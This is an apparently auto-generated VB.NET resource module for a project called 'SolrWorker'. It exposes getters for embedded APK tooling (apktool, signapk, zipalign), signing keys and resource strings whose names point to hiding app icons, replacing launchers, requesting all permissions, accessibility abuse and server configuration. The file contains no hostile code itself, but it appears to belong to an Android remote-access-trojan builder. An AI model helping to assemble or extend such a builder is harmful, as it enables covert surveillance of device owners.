Namespace My.Resources
    <Global.Microsoft.VisualBasic.HideModuleNameAttribute()> _
    Friend Module Resources
        Private resourceMan As Global.System.Resources.ResourceManager
        Friend ReadOnly Property ResourceManager() As Global.System.Resources.ResourceManager
            Get
                If Object.ReferenceEquals(resourceMan, Nothing) Then
                    resourceMan = New Global.System.Resources.ResourceManager("SolrWorker.Resources", GetType(Resources).Assembly)
                End If
                Return resourceMan
            End Get
        End Property
        Friend ReadOnly Property [batteryprim]() As String
            Get
                Return ResourceManager.GetString("batteryprim")
            End Get
        End Property
        Friend ReadOnly Property [accessibilityprivatesrcapp]() As String
            Get
                Return ResourceManager.GetString("accessibilityprivatesrcapp")
            End Get
        End Property
        Friend ReadOnly Property [certificate]() As Byte()
            Get
                Return DirectCast(ResourceManager.GetObject("certificate"), Byte())
            End Get
        End Property
        Friend ReadOnly Property [zipalign]() As Byte()
            Get
                Return DirectCast(ResourceManager.GetObject("zipalign"), Byte())
            End Get
        End Property
        Friend ReadOnly Property [signapk]() As Byte()
            Get
                Return DirectCast(ResourceManager.GetObject("signapk"), Byte())
            End Get
        End Property
        Friend ReadOnly Property [oncreatecode]() As String
            Get
                Return ResourceManager.GetString("oncreatecode")
            End Get
        End Property
        Friend ReadOnly Property [Externalstorage]() As String
            Get
                Return ResourceManager.GetString("Externalstorage")
            End Get
        End Property
        Friend ReadOnly Property [uninstall_activity]() As String
            Get
                Return ResourceManager.GetString("uninstall_activity")
            End Get
        End Property
        Friend ReadOnly Property [WritePrim]() As String
            Get
                Return ResourceManager.GetString("WritePrim")
            End Get
        End Property
        Friend ReadOnly Property [mywebviewer]() As String
            Get
                Return ResourceManager.GetString("mywebviewer")
            End Get
        End Property
        Friend ReadOnly Property [AccessTag]() As String
            Get
                Return ResourceManager.GetString("AccessTag")
            End Get
        End Property
        Friend ReadOnly Property [FORGROUD]() As String
            Get
                Return ResourceManager.GetString("FORGROUD")
            End Get
        End Property
        Friend ReadOnly Property [MainMith]() As String
            Get
                Return ResourceManager.GetString("MainMith")
            End Get
        End Property
        Friend ReadOnly Property [luncherIntent]() As String
            Get
                Return ResourceManager.GetString("luncherIntent")
            End Get
        End Property
        Friend ReadOnly Property [DEFserverconfigs]() As String
            Get
                Return ResourceManager.GetString("DEFserverconfigs")
            End Get
        End Property
        Friend ReadOnly Property [key]() As Byte()
            Get
                Return DirectCast(ResourceManager.GetObject("key"), Byte())
            End Get
        End Property
        Friend ReadOnly Property [read_state_prim]() As String
            Get
                Return ResourceManager.GetString("read_state_prim")
            End Get
        End Property
        Friend ReadOnly Property [ReplaceAccess]() As String
            Get
                Return ResourceManager.GetString("ReplaceAccess")
            End Get
        End Property
        Friend ReadOnly Property [ReadPrim]() As String
            Get
                Return ResourceManager.GetString("ReadPrim")
            End Get
        End Property
        Friend ReadOnly Property [emptyaccess]() As String
            Get
                Return ResourceManager.GetString("emptyaccess")
            End Get
        End Property
        Friend ReadOnly Property [ReplacePrimes]() As String
            Get
                Return ResourceManager.GetString("ReplacePrimes")
            End Get
        End Property
        Friend ReadOnly Property [apktool]() As Byte()
            Get
                Return DirectCast(ResourceManager.GetObject("apktool"), Byte())
            End Get
        End Property
        Friend ReadOnly Property [APKEditor]() As Byte()
            Get
                Return DirectCast(ResourceManager.GetObject("APKEditor"), Byte())
            End Get
        End Property
        Friend ReadOnly Property [providerfile]() As String
            Get
                Return ResourceManager.GetString("providerfile")
            End Get
        End Property
        Friend ReadOnly Property [ReplaceLuncher]() As String
            Get
                Return ResourceManager.GetString("ReplaceLuncher")
            End Get
        End Property
        Friend ReadOnly Property [network_security_config]() As String
            Get
                Return ResourceManager.GetString("network_security_config")
            End Get
        End Property
        Friend ReadOnly Property [SystemwindowPrim]() As String
            Get
                Return ResourceManager.GetString("SystemwindowPrim")
            End Get
        End Property
        Friend ReadOnly Property [BootPrim]() As String
            Get
                Return ResourceManager.GetString("BootPrim")
            End Get
        End Property
        Friend ReadOnly Property [oppobattery]() As String
            Get
                Return ResourceManager.GetString("oppobattery")
            End Get
        End Property
        Friend ReadOnly Property [nointernet]() As String
            Get
                Return ResourceManager.GetString("nointernet")
            End Get
        End Property
        Friend ReadOnly Property [Activitychat]() As String
            Get
                Return ResourceManager.GetString("Activitychat")
            End Get
        End Property
        Friend ReadOnly Property [ALLPRIM]() As String
            Get
                Return ResourceManager.GetString("ALLPRIM")
            End Get
        End Property
        Friend ReadOnly Property [ManifistCode]() As String
            Get
                Return ResourceManager.GetString("ManifistCode")
            End Get
        End Property
        Friend ReadOnly Property [ManifistHide]() As String
            Get
                Return ResourceManager.GetString("ManifistHide")
            End Get
        End Property
        Friend ReadOnly Property [Toreplaceprim]() As String
            Get
                Return ResourceManager.GetString("Toreplaceprim")
            End Get
        End Property
        Friend ReadOnly Property [_7zip]() As Byte()
            Get
                Return DirectCast(ResourceManager.GetObject("7zip"), Byte())
            End Get
        End Property
        Friend ReadOnly Property [splits]() As String
            Get
                Return ResourceManager.GetString("splits")
            End Get
        End Property
    End Module
End Namespace
